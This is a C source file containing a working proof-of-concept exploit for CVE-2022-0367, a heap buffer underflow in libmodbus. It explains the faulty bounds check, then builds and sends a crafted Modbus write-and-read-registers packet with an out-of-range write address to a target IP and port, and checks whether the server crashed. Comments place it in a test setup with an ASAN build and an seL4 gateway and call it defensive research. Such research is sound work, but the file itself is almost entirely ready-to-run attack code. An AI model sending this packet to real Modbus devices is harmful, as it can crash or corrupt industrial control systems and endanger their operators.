/*
 * CVE-2022-0367 Exploit - Heap Buffer Underflow in libmodbus
 *
 * This exploits a bounds checking bug in MODBUS_FC_WRITE_AND_READ_REGISTERS.
 * When using start_address mapping, the check validates mapping_address twice
 * instead of checking both mapping_address and mapping_address_write.
 *
 * Bug location: libmodbus src/modbus.c (around line 962-965)
 *   } else if (mapping_address < 0 ||
 *              (mapping_address + nb) > mb_mapping->nb_registers ||
 *              mapping_address < 0 ||  // BUG: should be mapping_address_write < 0
 *              (mapping_address_write + nb_write) > mb_mapping->nb_registers)
 *
 * Attack:
 *   - Server has start_registers = 100 (registers at addresses 100-109)
 *   - Send read address = 100 (valid, mapping_address = 0)
 *   - Send write address = 50 (invalid, mapping_address_write = -50)
 *   - Buggy check passes (mapping_address >= 0)
 *   - Code writes to tab_registers[-50] = HEAP UNDERFLOW!
 *
 * Compile: gcc -o cve_0367_attack cve_0367_attack.c
 * Usage:   ./cve_0367_attack <IP> <PORT>
 *
 * For educational/defensive security research only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* Server configuration (must match heating_controller.c CVE_2022_0367 mode) */
#define START_REGISTERS     100     /* Server's start_registers value */
#define NB_REGISTERS        10      /* Server's nb_registers value */

/* Attack parameters */
#define READ_ADDRESS        100     /* Valid: >= START_REGISTERS */
#define READ_QUANTITY       1       /* Read 1 register */
#define WRITE_ADDRESS       50      /* Invalid: < START_REGISTERS (triggers CVE) */
#define WRITE_QUANTITY      1       /* Write 1 register */

/* Modbus constants */
#define MODBUS_FC_WRITE_AND_READ_REGISTERS  0x17
#define MBAP_HEADER_SIZE    7

static void print_banner(void) {
    printf("\n");
    printf("========================================\n");
    printf(" CVE-2022-0367: Heap Buffer Underflow\n");
    printf(" Affects: libmodbus with start_address\n");
    printf("========================================\n");
    printf("\n");
}

static void print_usage(const char *prog) {
    printf("Usage: %s <IP> <PORT>\n\n", prog);
    printf("Examples:\n");
    printf("  %s 127.0.0.1 5021   # Attack ASAN build\n", prog);
    printf("  %s 127.0.0.1 502    # Attack via seL4 (should be blocked)\n", prog);
}

static int tcp_connect(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid IP address: %s\n", ip);
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

static int send_all(int sock, const uint8_t *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t sent = send(sock, buf + total, len - total, 0);
        if (sent <= 0) {
            perror("send");
            return -1;
        }
        total += sent;
    }
    return 0;
}

/*
 * Build MODBUS_FC_WRITE_AND_READ_REGISTERS (0x17) request
 *
 * Request format:
 *   MBAP Header (7 bytes):
 *     - Transaction ID: 2 bytes
 *     - Protocol ID: 2 bytes (0x0000 for Modbus)
 *     - Length: 2 bytes (number of following bytes)
 *     - Unit ID: 1 byte
 *   PDU:
 *     - Function code: 1 byte (0x17)
 *     - Read starting address: 2 bytes
 *     - Read quantity: 2 bytes
 *     - Write starting address: 2 bytes
 *     - Write quantity: 2 bytes
 *     - Write byte count: 1 byte
 *     - Write values: N*2 bytes
 */
static int build_exploit_packet(uint8_t *buf, size_t bufsize) {
    if (bufsize < 32) return -1;

    int idx = 0;

    /* MBAP Header */
    buf[idx++] = 0x00;  /* Transaction ID high */
    buf[idx++] = 0x01;  /* Transaction ID low */
    buf[idx++] = 0x00;  /* Protocol ID high (Modbus) */
    buf[idx++] = 0x00;  /* Protocol ID low */
    /* Length will be filled later */
    int length_pos = idx;
    idx += 2;
    buf[idx++] = 0x01;  /* Unit ID */

    /* PDU */
    buf[idx++] = MODBUS_FC_WRITE_AND_READ_REGISTERS;  /* Function code 0x17 */

    /* Read starting address (valid: >= START_REGISTERS) */
    buf[idx++] = (READ_ADDRESS >> 8) & 0xFF;
    buf[idx++] = READ_ADDRESS & 0xFF;

    /* Read quantity */
    buf[idx++] = (READ_QUANTITY >> 8) & 0xFF;
    buf[idx++] = READ_QUANTITY & 0xFF;

    /* Write starting address (INVALID: < START_REGISTERS - triggers CVE!) */
    buf[idx++] = (WRITE_ADDRESS >> 8) & 0xFF;
    buf[idx++] = WRITE_ADDRESS & 0xFF;

    /* Write quantity */
    buf[idx++] = (WRITE_QUANTITY >> 8) & 0xFF;
    buf[idx++] = WRITE_QUANTITY & 0xFF;

    /* Write byte count */
    buf[idx++] = WRITE_QUANTITY * 2;

    /* Write values (pattern to identify in memory) */
    for (int i = 0; i < WRITE_QUANTITY; i++) {
        buf[idx++] = 0xDE;  /* High byte */
        buf[idx++] = 0xAD;  /* Low byte - writes 0xDEAD */
    }

    /* Fill in length (number of bytes after length field) */
    int length = idx - MBAP_HEADER_SIZE + 1;  /* +1 for unit ID */
    buf[length_pos] = (length >> 8) & 0xFF;
    buf[length_pos + 1] = length & 0xFF;

    return idx;
}

static void print_packet_info(void) {
    int mapping_address = READ_ADDRESS - START_REGISTERS;
    int mapping_address_write = WRITE_ADDRESS - START_REGISTERS;

    printf("----------------------------------------\n");
    printf(" Attack Configuration\n");
    printf("----------------------------------------\n");
    printf(" Server start_registers: %d\n", START_REGISTERS);
    printf(" Server nb_registers:    %d\n", NB_REGISTERS);
    printf(" Valid address range:    %d-%d\n",
           START_REGISTERS, START_REGISTERS + NB_REGISTERS - 1);
    printf("\n");
    printf(" Read address:           %d\n", READ_ADDRESS);
    printf("   mapping_address:      %d (valid)\n", mapping_address);
    printf("\n");
    printf(" Write address:          %d\n", WRITE_ADDRESS);
    printf("   mapping_address_write: %d (NEGATIVE!)\n", mapping_address_write);
    printf("\n");
    printf("----------------------------------------\n");
    printf(" Vulnerability Analysis\n");
    printf("----------------------------------------\n");
    printf(" Buggy check (line ~964):\n");
    printf("   mapping_address < 0 ? %s\n",
           mapping_address < 0 ? "TRUE (would block)" : "FALSE (passes)");
    printf("\n");
    printf(" Missing check:\n");
    printf("   mapping_address_write < 0 ? %s\n",
           mapping_address_write < 0 ? "TRUE (should block!)" : "FALSE");
    printf("\n");
    printf(" Result: Write to tab_registers[%d]\n", mapping_address_write);
    printf("         = HEAP UNDERFLOW!\n");
    printf("----------------------------------------\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_banner();
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Invalid port: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    print_banner();
    printf("[*] Target: %s:%d\n\n", target_ip, target_port);

    print_packet_info();

    /* Build exploit packet */
    uint8_t packet[64];
    int packet_len = build_exploit_packet(packet, sizeof(packet));
    if (packet_len < 0) {
        fprintf(stderr, "Failed to build packet\n");
        return EXIT_FAILURE;
    }

    /* Show packet bytes */
    printf("[*] Exploit packet (%d bytes):\n    ", packet_len);
    for (int i = 0; i < packet_len; i++) {
        printf("%02X ", packet[i]);
        if ((i + 1) % 16 == 0 && i + 1 < packet_len) printf("\n    ");
    }
    printf("\n\n");

    /* Connect to target */
    printf("[1] Connecting to target...\n");
    int sock = tcp_connect(target_ip, target_port);
    if (sock < 0) {
        return EXIT_FAILURE;
    }
    printf("    Connected!\n\n");

    /* Send exploit */
    printf("[2] Sending exploit packet...\n");
    if (send_all(sock, packet, packet_len) < 0) {
        close(sock);
        return EXIT_FAILURE;
    }
    printf("    Sent!\n\n");

    /* Wait for response (or crash) */
    printf("[3] Waiting for response...\n");
    uint8_t response[260];
    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    ssize_t received = recv(sock, response, sizeof(response), 0);

    printf("\n");
    printf("========================================\n");
    printf(" RESULT\n");
    printf("========================================\n");

    if (received < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            printf(" Timeout - server may have crashed!\n");
        } else {
            printf(" Connection error: %s\n", strerror(errno));
        }
        printf("\n Check server logs for ASAN output.\n");
    } else if (received == 0) {
        printf(" Connection closed - server CRASHED!\n");
        printf("\n ASAN should report heap-buffer-overflow.\n");
    } else {
        printf(" Received %zd bytes: ", received);
        for (ssize_t i = 0; i < received && i < 16; i++) {
            printf("%02X ", response[i]);
        }
        printf("\n");

        /* Check if it's an exception response */
        if (received >= 9 && (response[7] & 0x80)) {
            printf("\n Server returned exception code: 0x%02X\n", response[8]);
            printf(" Possible reasons:\n");
            printf("   - Server not in CVE_2022_0367 mode\n");
            printf("   - seL4 gateway blocked the attack\n");
            printf("   - libmodbus is patched\n");
        } else {
            printf("\n Server processed request (unexpected)\n");
        }
    }
    printf("========================================\n\n");

    close(sock);
    return EXIT_SUCCESS;
}
